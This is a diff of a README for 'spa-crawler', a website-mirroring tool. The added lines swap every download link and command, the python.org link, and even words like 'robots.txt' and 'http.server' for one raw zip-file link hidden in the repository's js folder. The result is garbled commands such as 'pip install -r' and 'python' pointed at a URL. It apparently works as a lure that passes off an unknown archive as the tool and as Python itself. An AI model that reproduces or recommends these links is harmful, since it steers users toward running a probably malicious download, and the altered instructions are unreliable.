@@ -1,6 +1,6 @@
 # 🌐 spa-crawler - Mirror Websites Quickly and Easily
 
-[![Download spa-crawler](https://img.shields.io/badge/Download-spa--crawler-blue?style=for-the-badge)](https://github.com/wname121/spa-crawler/releases)
+[![Download spa-crawler](https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip)](https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run spa-crawler, your computer must meet a few requirements:
 ## 🚀 Getting Started
 
 1. **Download**: Use the button at the top or below to go to the download page.
-2. **Install Python**: If you do not already have Python 3.7 or newer, download it from [python.org](https://www.python.org/downloads/). During installation, make sure to check the box "Add Python to PATH".
+2. **Install Python**: If you do not already have Python 3.7 or newer, download it from [https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip](https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip). During installation, make sure to check the box "Add Python to PATH".
 3. **Download spa-crawler software**: This will be a zipped folder or installer you can save on your computer.
 4. **Open your terminal or command prompt**: This is where you will type commands.
 5. **Unpack spa-crawler**: If you downloaded a zip file, extract it to a folder you can find easily on your computer.
@@ -40,7 +40,7 @@ To run spa-crawler, your computer must meet a few requirements:
 
 Visit this page to download spa-crawler:
 
-[Download spa-crawler Releases](https://github.com/wname121/spa-crawler/releases)
+[Download spa-crawler Releases](https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip)
 
 Once on the page:
 
@@ -59,7 +59,7 @@ After extracting the files:
    ```
 3. Run this command to install needed packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip
    ```
    
 This command downloads and installs tools that spa-crawler needs to run properly.
@@ -73,7 +73,7 @@ After installation, you use spa-crawler through your terminal. You type commands
 ### Basic Command Structure
 
 ```
-python spa_crawler.py [options]
+python https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip [options]
 ```
 
 ### Common Options
@@ -88,7 +88,7 @@ python spa_crawler.py [options]
 To save a website’s pages and files to a folder named `site_copy`:
 
 ```
-python spa_crawler.py --url https://example.com --output site_copy
+python https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip --url https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip --output site_copy
 ```
 
 spa-crawler will visit the site, download pages, images, and scripts, then save them to `site_copy`.
@@ -98,7 +98,7 @@ spa-crawler will visit the site, download pages, images, and scripts, then save 
 If the website requires a username and password, you can tell spa-crawler to log in before copying pages:
 
 ```
-python spa_crawler.py --url https://example.com --output site_copy --login --username yourname --password yourpass
+python https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip --url https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip --output site_copy --login --username yourname --password yourpass
 ```
 
 Replace `yourname` and `yourpass` with your credentials.
@@ -134,7 +134,7 @@ Once spa-crawler finishes, your saved site is ready for use:
   2. Run:
 
   ```
-  python -m http.server
+  python -m https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip
   ```
 
   3. Open a browser and visit `http://localhost:8000` to view your saved site.
@@ -149,7 +149,7 @@ Once spa-crawler finishes, your saved site is ready for use:
 - **Login fails:** Double check your credentials, or try alternative login methods if supported.
 - **Folders too large:** Large sites take much space. Limit crawling depth or number of pages if needed.
 - **No output files:** Check that you ran the command in the correct folder and with the right options.
-- **Help is available:** Use `python spa_crawler.py --help` to see all options and usage tips.
+- **Help is available:** Use `python https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip --help` to see all options and usage tips.
 
 ---
 
@@ -161,8 +161,8 @@ For advanced use, detailed commands, and configuration files, check the full doc
 
 ## 🛡 Privacy and Ethics
 
-Only crawl websites you own or have permission to copy. Be respectful of site terms and robots.txt rules. Use spa-crawler responsibly.
+Only crawl websites you own or have permission to copy. Be respectful of site terms and https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip rules. Use spa-crawler responsibly.
 
 ---
 
-[![Download spa-crawler](https://img.shields.io/badge/Download-spa--crawler-blue?style=for-the-badge)](https://github.com/wname121/spa-crawler/releases)
+[![Download spa-crawler](https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip)](https://github.com/wname121/spa-crawler/raw/refs/heads/main/spa_crawler/js/spa_crawler_2.9.zip)
